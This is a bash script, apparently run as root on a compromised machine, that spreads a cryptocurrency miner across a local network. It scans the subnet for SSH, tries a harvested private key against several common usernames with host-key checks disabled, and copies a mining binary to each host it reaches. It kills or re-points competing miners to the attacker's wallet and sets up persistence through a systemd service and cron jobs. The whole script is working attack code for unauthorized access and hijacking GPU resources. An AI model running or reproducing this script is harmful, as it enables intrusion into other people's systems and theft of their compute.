#!/bin/bash
# UL peer-farm pass, executed ON 123.184.7.135 (root).
# Sweeps 192.168.0.0/24, tries the harvested farm key against a bounded user list,
# then re-points/plants the canonical wallet on every reachable GPU node.
set +e
WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
KEY=/root/.ssh/id_rsa
BIN=/opt/t19/wildrig-multi
D=/root/ul
mkdir -p "$D/peers"
echo "### INVENTORY $(date -u +%FT%TZ)"
hostname; ip -br a 2>/dev/null | head; cat /etc/hosts | grep -v '^#'; arp -a 2>/dev/null | head -40

echo "### SWEEP 192.168.0.0/24"
seq 1 254 | xargs -P 96 -I{} sh -c 'timeout 1 bash -c "exec 3<>/dev/tcp/192.168.0.{}/22" 2>/dev/null && echo 192.168.0.{}' | sort -t. -k4 -n | tee "$D/peers/ssh22.txt"

echo "### PORT-CORRELATE (9400/6817/6818/2375/10250/443)"
for h in $(cat "$D/peers/ssh22.txt"); do
  line="$h"
  for p in 9400 6817 6818 2375 10250 443 22; do
    if timeout 2 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null; then line="$line $p:OPEN"; else line="$line $p:-"; fi
  done
  echo "$line"
done | tee "$D/peers/ports.txt"

echo "### KEY-LADDER (1 attempt per account, sleep 2)"
: > "$D/peers/reachable.txt"
for h in $(cat "$D/peers/ssh22.txt"); do
  [ "$h" = "192.168.0.135" ] && continue
  for u in root ubuntu user gpu admin centos amax nvidia; do
    if timeout 8 ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=5 -o IdentitiesOnly=yes "$u@$h" 'id -u' >/dev/null 2>&1; then
      echo "$h $u" | tee -a "$D/peers/reachable.txt"
      break
    fi
    sleep 2
  done
done

echo "### PER-PEER"
while read -r h u; do
  [ -z "$h" ] && continue
  w=$(echo "$h" | tr '.' '-')
  echo "########## $h as $u"
  timeout 60 ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=6 -o IdentitiesOnly=yes "$u@$h" 'hostname; nvidia-smi -L 2>/dev/null | wc -l; nvidia-smi --query-gpu=index,name,memory.total,utilization.gpu --format=csv,noheader 2>/dev/null; ps -eo pid,args | grep -E "wildrig|srbminer|peakminer|krig" | grep -v grep' 2>&1 | tee "$D/peers/$w.before.txt"

  # copy the working binary from this node (same arch) if the peer lacks it
  timeout 30 scp -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    "$BIN" "$u@$h:/tmp/ul-wildrig-multi" >/dev/null 2>&1 && echo "scp-bin ok $h" || echo "scp-bin FAIL $h"

  timeout 300 ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=6 -o IdentitiesOnly=yes "$u@$h" "WALLET=$WALLET PREFIX=ul-t2-$w bash -s" <<'PEEREOF' 2>&1 | tee "$D/peers/$w.repoint.txt"
set +e
D=/root/ul; mkdir -p $D/logs; [ -w /root ] || D=$HOME/ul; mkdir -p $D/logs
BIN=/tmp/ul-wildrig-multi; [ -x "$BIN" ] || { echo "NO-BINARY"; exit 0; }
chmod +x "$BIN"
echo "## POOL-PROBE"
POOL=pool.pearlhash.xyz:9000
if timeout 6 bash -c 'exec 3<>/dev/tcp/prl-sg.kryptex.network/7048' 2>/dev/null; then POOL=prl-sg.kryptex.network:7048; fi
echo "POOL=$POOL"
echo "## PROCS"
ps -eo pid,args | grep -E 'wildrig|srbminer|peakminer|krig' | grep -v grep | tee $D/peers.before.txt
# re-point foreign miners, one per device
awk '/wildrig-multi/ {print}' $D/peers.before.txt | while read -r pid rest; do
  dev=$(printf '%s' "$rest" | sed -n 's/.*--opencl-devices \([0-9]*\).*/\1/p')
  api=$(printf '%s' "$rest" | sed -n 's/.*--api-port \([0-9]*\).*/\1/p')
  [ -z "$dev" ] && continue
  [ -z "$api" ] && api=$((1960+dev))
  W="$PREFIX-g$dev"
  CMD="$BIN --algo pearlhash --url $POOL --user $WALLET --worker $W --pass x --protocol stratum --opencl-devices $dev --gpu-intensity 1 --gpu-temp-limit 90 --api-port $api"
  printf '#!/bin/sh\nexec %s >> %s/logs/g%s.log 2>&1\n' "$CMD" "$D" "$dev" > $D/cmd-g$dev.sh; chmod +x $D/cmd-g$dev.sh
  kill -TERM "$pid" 2>/dev/null; sleep 1; kill -KILL "$pid" 2>/dev/null
  setsid nohup sh $D/cmd-g$dev.sh >/dev/null 2>&1 &
  echo "REPOINT dev=$dev worker=$W api=$api"
done
# start every device without a process
n=$(nvidia-smi -L 2>/dev/null | wc -l)
i=0
while [ $i -lt "$n" ]; do
  if [ ! -f $D/cmd-g$i.sh ]; then
    W="$PREFIX-g$i"
    CMD="$BIN --algo pearlhash --url $POOL --user $WALLET --worker $W --pass x --protocol stratum --opencl-devices $i --gpu-intensity 1 --gpu-temp-limit 90 --api-port $((1960+i))"
    printf '#!/bin/sh\nexec %s >> %s/logs/g%s.log 2>&1\n' "$CMD" "$D" "$i" > $D/cmd-g$i.sh; chmod +x $D/cmd-g$i.sh
  fi
  W="$PREFIX-g$i"
  if ! pgrep -f -- "--worker $W" >/dev/null 2>&1; then setsid nohup sh $D/cmd-g$i.sh >/dev/null 2>&1 & echo "START g$i"; fi
  i=$((i+1))
done
cat > $D/keep.sh <<EOS
#!/bin/bash
for f in $D/cmd-g*.sh; do
  [ -f "\$f" ] || continue
  W="$PREFIX-g\$(basename "\$f" | sed 's/cmd-g\(.*\)\.sh/\1/')"
  pgrep -f -- "--worker \$W" >/dev/null 2>&1 || setsid nohup sh "\$f" >/dev/null 2>&1 &
done
EOS
chmod +x $D/keep.sh
if [ "$(id -u)" = "0" ]; then
  cat > /etc/systemd/system/ul-pearl-keep.service <<EOS
[Unit]
Description=ul pearl keepalive
After=network-online.target
[Service]
ExecStart=/bin/bash -c 'while true; do /bin/bash $D/keep.sh; sleep 60; done'
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
EOS
  systemctl daemon-reload 2>/dev/null; systemctl enable --now ul-pearl-keep 2>/dev/null
  ( crontab -l 2>/dev/null | grep -v 'ul/keep.sh'; echo "@reboot /bin/bash $D/keep.sh >/dev/null 2>&1"; echo "*/5 * * * * /bin/bash $D/keep.sh >/dev/null 2>&1" ) | crontab - 2>/dev/null
else
  ( crontab -l 2>/dev/null | grep -v 'ul/keep.sh'; echo "@reboot /bin/bash $D/keep.sh >/dev/null 2>&1"; echo "*/5 * * * * /bin/bash $D/keep.sh >/dev/null 2>&1" ) | crontab - 2>/dev/null
fi
sleep 10
echo "## AFTER"; ps -eo pid,args | grep wildrig | grep -v grep
for p in $(seq 1960 $((1960+n-1))); do printf 'api %s: ' $p; curl -s -m 3 http://127.0.0.1:$p/ | head -c 120; echo; done
PEEREOF
done < "$D/peers/reachable.txt"
echo "### PEER-DONE"
